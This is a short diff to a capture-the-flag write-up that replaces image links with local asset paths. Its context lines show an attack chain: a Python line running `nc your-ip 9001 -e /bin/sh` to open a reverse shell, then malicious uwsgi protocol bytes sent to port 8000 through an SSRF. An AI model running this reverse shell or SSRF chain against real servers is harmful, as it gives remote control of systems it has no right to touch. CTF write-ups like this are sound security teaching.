@@ -48,11 +48,11 @@ import os
 os.system("nc your-ip 9001 -e /bin/sh")
 ```
 
-![](https://i.imgur.com/CDjAYpG.png)
+![img1](./assets/img1.png?raw=true)
 
 5.Generate evil uwsgi protocol bytes, `/usr/src/rwctf/media/2021/05/16/fb08beef-ebce-41e5-9b75-1316552e102b` is the evil python code that you have downloaded.
 
 6.Use SSRF to send evil bytes to uwsgi port 8000:
 
-![](https://i.imgur.com/xf0rL0t.png)
+![img2](./assets/img2.png?raw=true)
 
